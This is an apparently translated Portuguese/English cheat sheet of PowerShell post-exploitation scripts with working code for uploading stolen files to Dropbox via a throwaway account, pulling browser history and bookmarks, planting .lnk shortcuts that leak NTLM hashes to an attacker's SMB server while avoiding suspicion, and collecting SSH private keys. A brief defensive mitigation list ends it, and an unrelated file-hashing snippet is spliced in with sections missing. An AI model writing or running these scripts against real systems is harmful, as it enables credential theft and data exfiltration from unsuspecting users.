3. Exfiltração para Dropbox / File Exfiltration to Dropbox Original

Quando não podes usar RDP ou Mega, ter uma forma rápida de empurrar ficheiros para fora ajuda. Este script PowerShell carrega ficheiros para o Dropbox com o mínimo de complicações. Adaptado do original de I-Am-Jacoby para lidar com nomes de ficheiro não-ingleses: qualquer ficheiro com nome estrangeiro é copiado para C:\Users\Public\Documents com um nome aleatório, carregado e depois apagado localmente. When you can't use RDP or Mega, having a quick way to push files out helps. This PowerShell script uploads files to Dropbox with minimal fuss. Adapted from I-Am-Jacoby's original to handle non-English filenames: any file with a foreign name is copied to C:\Users\Public\Documents under a random filename, uploaded, then deleted locally.

3.1 Setup

Criar conta Dropbox com email descartável; gerar access token no developer console; adicionar o token ao script. Create a Dropbox account with a throwaway email; generate an access token in the developer console; add the token to the script.

3.2 Usage

PS > . .\dropbox.ps1
PS > "file.txt" | DropBox-Upload

3.3 Implementação de referência Complementar

O artigo não inclui o código-fonte. A implementação abaixo reproduz a lógica descrita. The article doesn't include the source. The implementation below reproduces the described logic. 
$script:DropboxToken = "YOUR_TOKEN_HERE"
function DropBox-Upload {
  param([Parameter(ValueFromPipeline)]$Path)
  process {
    if (-not (Test-Path $Path)) { Write-Warning "Not found: $Path"; return }
    $tmp = Join-Path "C:\Users\Public\Documents" "$([guid]::NewGuid().ToString('N')).tmp"
    Copy-Item $Path $tmp -Force
    $apiArg = @{ path="/$([IO.Path]::GetFileName($tmp))"; mode="add"; autorename="true"; mute="false" } | ConvertTo-Json -Compress
    $h = @{ Authorization="Bearer $script:DropboxToken"; "Dropbox-API-Arg"=$apiArg; "Content-Type"="application/octet-stream" }
    try { Invoke-RestMethod -Uri "https://content.dropboxapi.com/2/files/upload" -Method Post -Headers $h -InFile $tmp; Write-Host "[+] Uploaded: $Path" -ForegroundColor Green }
    catch { Write-Warning "Upload failed: $($_.Exception.Message)" }
    finally { Remove-Item $tmp -Force -ErrorAction SilentlyContinue }
  }
}

4. Browser History & Bookmarks Exfiltration Original

O histórico e os bookmarks do browser revelam onde os utilizadores vão e o que guardam. Este script extrai dados do Chrome ou Edge para veres sites guardados, páginas de login e mais. Browser history and bookmarks reveal where users go and what they store. This script pulls data from Chrome or Edge so you can see saved sites, login pages, and more.

4.1 Usage

4.2 Implementação de referência Complementar

A base History fica bloqueada enquanto o browser corre — copia para %TEMP% e consulta com sqlite3.exe. Os Bookmarks são JSON. The History DB is locked while the browser runs — copy to %TEMP% and query with sqlite3.exe. Bookmarks are JSON. 
function Get-BrowserData {
  param([ValidateSet('chrome','edge')][string]$Browser,[ValidateSet('history','bookmarks')][string]$DataType)
  $root = switch ($Browser) { 'chrome' { "$env:LOCALAPPDATA\Google\Chrome\User Data\Default" } 'edge' { "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default" } }
  if ($DataType -eq 'history') {
    $tmp = Join-Path $env:TEMP "hist_$([guid]::NewGuid().ToString('N')).db"
    Copy-Item "$root\History" $tmp -Force
    & sqlite3 $tmp "SELECT url,title,datetime(last_visit_time/1000000-11644473600,'unixepoch') AS lv FROM urls ORDER BY last_visit_time DESC LIMIT 50;"
    Remove-Item $tmp -Force
  } else {
    (Get-Content "$root\Bookmarks" -Raw | ConvertFrom-Json).roots.bookmark_bar.children | Select name,url
  }
}

6. SMB Hash Leak Original

Este script cria atalhos .lnk a apontar para um share SMB inexistente. Quando os utilizadores abrem ou pré-visualizam o link, a máquina envia um hash NTLM para o teu servidor. Capturas com Responder ou Inveigh e crackeas offline. Escolhe nomes de ficheiro que se integrem em shares existentes para evitar suspeita. This script crafts .lnk shortcuts pointing to a nonexistent SMB share. When users open or preview the link, their machine sends an NTLM hash to your server. You capture it with Responder or Inveigh and crack it offline. Pick filenames that fit into existing shares to avoid suspicion.

6.1 Usage

PS > . .\leak.ps1
PS > Create-SMBHashLeakLnk -LnkFilePath ".\grab.lnk" -SmbSharePath "\\192.168.254.43\share\file.exe" -Description "Please wait..."

6.2 Implementação de referência Complementar

function Create-SMBHashLeakLnk {
  param([Parameter(Mandatory)][string]$LnkFilePath,[Parameter(Mandatory)][string]$SmbSharePath,[string]$Description="Please wait...",[string]$IconLocation="shell32.dll,1")
  $full=[IO.Path]::GetFullPath($LnkFilePath); $ws=New-Object -ComObject WScript.Shell; $lnk=$ws.CreateShortcut($full)
  $lnk.TargetPath=$SmbSharePath; $lnk.Description=$Description; $lnk.IconLocation=$IconLocation; $lnk.Save()
  Write-Host "[+] Created: $full -> $SmbSharePath" -ForegroundColor Green
}

7. SSH Key Exfiltration Original

Este script exfiltra chaves SSH dos locais por omissão e codifica todos os dados recolhidos em Base64. Se necessário, podes especificar um diretório personalizado. Para ler os dados extraídos, descodifica o output Base64. This script exfiltrates SSH keys from default locations and encodes all collected data in Base64. If needed, you can specify a custom directory. To read the extracted data, decode the Base64 output.

7.1 Usage

PS > . .\ssh.ps1
PS > $data = Get-Ssh
PS > $data = Get-Ssh -sshKeyDirectoryPath "C:\Custom\Path\To\.ssh"
PS > [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($data))

7.2 Implementação de referência Complementar

function Get-Ssh {
  param([string]$sshKeyDirectoryPath="$env:USERPROFILE\.ssh")
  if (-not (Test-Path $sshKeyDirectoryPath)) { Write-Warning "Not found"; return $null }
  $blob = foreach ($f in Get-ChildItem $sshKeyDirectoryPath -File -EA SilentlyContinue) { "`n### $($f.Name) ###`n" + (Get-Content $f.FullName -Raw) }
  return [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes(($blob -join "")))
}

param([Parameter(Mandatory)][string]$Path)
$out=Join-Path $Path "manifest.sha256"
Get-ChildItem $Path -Recurse -File|?{$_.Name -ne "manifest.sha256"}|%{"$((Get-FileHash $_.FullName -Algorithm SHA256).Hash)  $($_.FullName)"}|Out-File $out -Encoding UTF8

11. Mitigações Blue Team / Mitigations Complementar

  1. Egress filtering com allowlist — bloqueia Dropbox, Pastebin, IPs de C2.
  2. Monitorizar acesso a History/Bookmarks (Sysmon FileAccess) e cópias para %TEMP%.
  3. Proteger .ssh com ACLs; usar SSH agent.
  4. Monitorizar leitura massiva de ConsoleHost_history.txt em C:\Users\*.
  5. SMB signing + desativar NTLMv1 + RestrictSendingNTLMToRemote.
  6. Bloquear criação de .lnk em shares e monitorizar (Sysmon 11).
  7. AMSI + Script Block Logging (4104) — deteta Invoke-RestMethod, Base64, revshell.
  8. Constrained Language Mode + AppLocker — bloqueia SQLite assembly e scripts não assinados.
  9. DLP para uploads cloud e Base64 em CLI.
  10. Honeytokens — ficheiros .ssh falsos, histórico com iscas.
